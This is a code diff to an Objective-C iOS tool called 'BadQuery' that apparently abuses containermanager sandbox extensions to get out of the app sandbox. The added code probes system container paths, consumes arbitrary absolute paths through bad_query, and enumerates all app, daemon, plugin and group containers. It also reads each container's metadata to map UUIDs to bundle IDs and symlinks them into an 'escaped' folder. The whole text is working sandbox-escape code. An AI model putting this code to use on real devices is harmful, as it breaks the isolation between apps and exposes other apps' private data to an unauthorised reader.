@@ -9,6 +9,8 @@
 #import <dlfcn.h>
 #import <errno.h>
 #import <fcntl.h>
+#import <stdlib.h>
+#import <string.h>
 #import <sys/stat.h>
 #import <sys/sysctl.h>
 #import <unistd.h>
@@ -37,7 +39,8 @@ static void logLine(NSString *line)
         NSString *dir = logPath.stringByDeletingLastPathComponent;
         [[NSFileManager defaultManager] createDirectoryAtPath:dir
             withIntermediateDirectories:YES attributes:nil error:nil];
-        [full writeToFile:logPath atomically:YES
+        // Rewrite the accumulated log (the old code only kept the last line).
+        [gLog writeToFile:logPath atomically:YES
             encoding:NSUTF8StringEncoding error:nil];
     }
 }
@@ -339,10 +342,8 @@ static NSMutableDictionary *runSingleProbe(NSString *name, NSString *path,
 
 // BadQueryProbeRun: run every probe, write results and a full step log.
 // Synchronous; call from a background queue.
-void BadQueryProbeRun(void)
+static void BadQueryProbeRunInternal(void)
 {
-    static dispatch_once_t onceToken;
-    dispatch_once(&onceToken, ^{
         gLog = [NSMutableString string];
         logLine(@"==== BadQueryProbe start ====");
         logLine([NSString stringWithFormat:@"environment: %@", environmentInfo()]);
@@ -360,6 +361,8 @@ void BadQueryProbeRun(void)
               @"Path": @"/var/mobile/Containers/Data/PluginKitPlugin"},
             @{@"Name": @"AppGroup root",
               @"Path": @"/var/mobile/Containers/Shared/AppGroup"},
+            @{@"Name": @"SystemGroup root (iOS 26 path)",
+              @"Path": @"/var/mobile/Containers/Shared/SystemGroup"},
             @{@"Name": @"SystemGroup root (iOS 27 path)",
               @"Path": @"/var/containers/Shared/SystemGroup"},
             @{@"Name": @"System Data root (iOS 27 path)",
@@ -399,7 +402,9 @@ void BadQueryProbeRun(void)
         if ([appRootResult[@"Status"] isEqualToString:@"escaped"] &&
             [appRootResult[@"IsDirectory"] boolValue]) {
             logLine(@"==== fsgetpath enumeration of App Data root ====");
-            char *list = bad_query_list("/private/var/mobile/Containers/Data/Application", 5000000);
+            // bad_query_list strips "/private/var/" internally, so the probe
+            // path must use the un-prefixed /var form or every entry is skipped.
+            char *list = bad_query_list("/var/mobile/Containers/Data/Application", 5000000);
             if (list) {
                 NSString *text = [NSString stringWithUTF8String:list];
                 NSArray *lines = [text componentsSeparatedByString:@"\n"];
@@ -424,5 +429,196 @@ void BadQueryProbeRun(void)
         [report writeToFile:resultsPath atomically:YES];
         logStep(YES, @"write results", resultsPath);
         logLine(@"==== BadQueryProbe done ====");
+}
+
+void BadQueryProbeRun(void)
+{
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^{
+        BadQueryProbeRunInternal();
     });
+}
+
+void BadQueryProbeRunAgain(void)
+{
+    BadQueryProbeRunInternal();
+}
+
+NSDictionary *BadQueryProbeLastReport(void)
+{
+    NSString *resultsPath = [probeRoot() stringByAppendingPathComponent:@"BadQuery Probe Results.plist"];
+    NSDictionary *report = [NSDictionary dictionaryWithContentsOfFile:resultsPath];
+    return [report isKindOfClass:NSDictionary.class] ? report : nil;
+}
+
+NSString *BadQueryProbeLogText(void)
+{
+    NSString *logPath = [probeRoot() stringByAppendingPathComponent:@"BadQuery Probe Log.txt"];
+    NSString *text = [NSString stringWithContentsOfFile:logPath encoding:NSUTF8StringEncoding error:nil];
+    return text ?: @"";
+}
+
+static NSString *BadQueryCodeText(int64_t code)
+{
+    switch (code) {
+        case -255: return @"not an absolute path";
+        case -254: return @"file does not exist";
+        case -5:   return @"asprintf failed";
+        case -4:   return @"kernel refused to issue sandbox extension";
+        case -3:   return @"outside of containermanager's sandbox";
+        case -2:   return @"failed to create sandbox query";
+        case -1:   return @"failed to resolve one or more functions";
+        default:   return @"unknown error";
+    }
+}
+
+int64_t BadQueryConsumePath(NSString *path, NSString *groupIdentifier,
+                            BOOL isGroup, NSString **error)
+{
+    if (!path.length || ![path hasPrefix:@"/"]) {
+        if (error) *error = @"path must be absolute";
+        return -255;
+    }
+    char *pathBuffer = strdup(path.UTF8String);
+    char *groupBuffer = groupIdentifier.length ? strdup(groupIdentifier.UTF8String) : NULL;
+    if (!pathBuffer || (groupIdentifier.length && !groupBuffer)) {
+        free(pathBuffer);
+        free(groupBuffer);
+        if (error) *error = @"out of memory";
+        return -255;
+    }
+    int64_t handle = bad_query(pathBuffer, false, groupBuffer, isGroup);
+    free(pathBuffer);
+    free(groupBuffer);
+    if (handle < 0 && error)
+        *error = [NSString stringWithFormat:@"bad_query failed (code=%lld: %@)",
+            handle, BadQueryCodeText(handle)];
+    return handle;
+}
+
+void BadQueryReleaseHandle(int64_t handle)
+{
+    bad_query_release(handle);
+}
+
+#pragma mark - Container enumeration (UUID -> bundle ID)
+
+static NSString *BadQueryEscapedRoot(void)
+{
+    return [probeRoot() stringByAppendingPathComponent:kBadQueryDirectoryName];
+}
+
+static BOOL BadQuerySafeLinkName(NSString *name)
+{
+    if (name.length == 0 || name.length > 255) return NO;
+    NSCharacterSet *allowed = [NSCharacterSet characterSetWithCharactersInString:
+        @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_"];
+    return [name rangeOfCharacterFromSet:allowed.invertedSet].location == NSNotFound &&
+        ![name isEqualToString:@"."] && ![name isEqualToString:@".."];
+}
+
+static NSDictionary *BadQueryEnumerateRoot(NSString *title, NSString *rootPath,
+                                           NSString *folderName, BOOL useGroupRoute)
+{
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    result[@"Name"] = title;
+    result[@"Root"] = rootPath;
+    NSString *error = nil;
+    int64_t handle = BadQueryConsumePath(rootPath,
+        useGroupRoute ? sacrificeGroupId() : nil, useGroupRoute, &error);
+    if (handle < 0) {
+        result[@"Status"] = @"failed";
+        result[@"Error"] = error ?: [NSString stringWithFormat:@"consume failed (%lld)", handle];
+        logStep(NO, [NSString stringWithFormat:@"enumerate %@", title],
+            result[@"Error"]);
+        return result;
+    }
+    result[@"Handle"] = @(handle);
+
+    char *pathCopy = strdup(rootPath.UTF8String);
+    char *list = pathCopy ? bad_query_list(pathCopy, 5000000) : NULL;
+    free(pathCopy);
+    if (!list) {
+        result[@"Status"] = @"failed";
+        result[@"Error"] = @"bad_query_list returned NULL (fsgetpath denied)";
+        logStep(NO, [NSString stringWithFormat:@"enumerate %@", title], result[@"Error"]);
+        return result;
+    }
+
+    NSString *folder = [BadQueryEscapedRoot() stringByAppendingPathComponent:folderName];
+    [[NSFileManager defaultManager] createDirectoryAtPath:folder
+        withIntermediateDirectories:YES attributes:@{NSFilePosixPermissions: @0700} error:nil];
+    NSMutableArray<NSDictionary *> *entries = [NSMutableArray array];
+    NSArray<NSString *> *lines = [[NSString stringWithUTF8String:list]
+        componentsSeparatedByString:@"\n"];
+    for (NSString *line in lines) {
+        if (!line.length) continue;
+        NSString *child = line;
+        NSString *uuid = child.lastPathComponent;
+        if (uuid.length == 0 || [uuid hasPrefix:@"."]) continue;
+
+        NSString *identifier = uuid;
+        NSString *metadataPath = [child stringByAppendingPathComponent:
+            @".com.apple.mobile_container_manager.metadata.plist"];
+        NSDictionary *metadata = [NSDictionary dictionaryWithContentsOfFile:metadataPath];
+        NSString *meta = [metadata[@"MCMMetadataIdentifier"]
+            isKindOfClass:NSString.class] ? metadata[@"MCMMetadataIdentifier"] : nil;
+        if (BadQuerySafeLinkName(meta)) identifier = meta;
+
+        // Always keep the UUID link for traceability; use the bundle ID as the
+        // human-friendly primary link when it is available and unique.
+        NSString *uuidLink = [folder stringByAppendingPathComponent:uuid];
+        struct stat status = {0};
+        if (lstat(uuidLink.fileSystemRepresentation, &status) == 0 && S_ISLNK(status.st_mode))
+            unlink(uuidLink.fileSystemRepresentation);
+        if (symlink(child.fileSystemRepresentation, uuidLink.fileSystemRepresentation) == 0)
+            [entries addObject:@{@"UUID": uuid, @"Identifier": identifier, @"Path": child}];
+
+        if (![identifier isEqualToString:uuid]) {
+            NSString *nameLink = [folder stringByAppendingPathComponent:identifier];
+            if (lstat(nameLink.fileSystemRepresentation, &status) == 0 && S_ISLNK(status.st_mode))
+                unlink(nameLink.fileSystemRepresentation);
+            symlink(child.fileSystemRepresentation, nameLink.fileSystemRepresentation);
+        }
+    }
+    free(list);
+
+    result[@"Status"] = @"done";
+    result[@"Count"] = @(entries.count);
+    result[@"Entries"] = entries;
+    NSString *indexPath = [folder stringByAppendingPathComponent:@"INDEX.plist"];
+    [entries writeToFile:indexPath atomically:YES];
+    logStep(YES, [NSString stringWithFormat:@"enumerate %@", title],
+        [NSString stringWithFormat:@"%lu containers -> %@", (unsigned long)entries.count, folder]);
+    return result;
+}
+
+NSDictionary *BadQueryEnumerateAllContainers(void)
+{
+    NSMutableArray<NSDictionary *> *results = [NSMutableArray array];
+    BOOL sacrifice = sacrificeGroupId().length > 0;
+    [results addObject:BadQueryEnumerateRoot(@"App Data",
+        @"/var/mobile/Containers/Data/Application", @"App Data", NO)];
+    [results addObject:BadQueryEnumerateRoot(@"InternalDaemon",
+        @"/var/mobile/Containers/Data/InternalDaemon", @"InternalDaemon", NO)];
+    [results addObject:BadQueryEnumerateRoot(@"PluginKitPlugin",
+        @"/var/mobile/Containers/Data/PluginKitPlugin", @"PluginKitPlugin", NO)];
+    [results addObject:BadQueryEnumerateRoot(@"App Groups",
+        @"/var/mobile/Containers/Shared/AppGroup", @"App Groups", sacrifice)];
+    [results addObject:BadQueryEnumerateRoot(@"System Groups",
+        @"/var/mobile/Containers/Shared/SystemGroup", @"System Groups", NO)];
+    [results addObject:BadQueryEnumerateRoot(@"SystemGroup (new path)",
+        @"/var/containers/Shared/SystemGroup", @"SystemGroup (new path)", NO)];
+
+    NSDictionary *summary = @{
+        @"Version": @1,
+        @"CreatedAt": NSDate.date,
+        @"SacrificeGroup": sacrificeGroupId() ?: @"",
+        @"Results": results,
+    };
+    NSString *summaryPath = [BadQueryEscapedRoot()
+        stringByAppendingPathComponent:@"Enumerate Results.plist"];
+    [summary writeToFile:summaryPath atomically:YES];
+    logStep(YES, @"enumerate all containers", summaryPath);
+    return summary;
 }
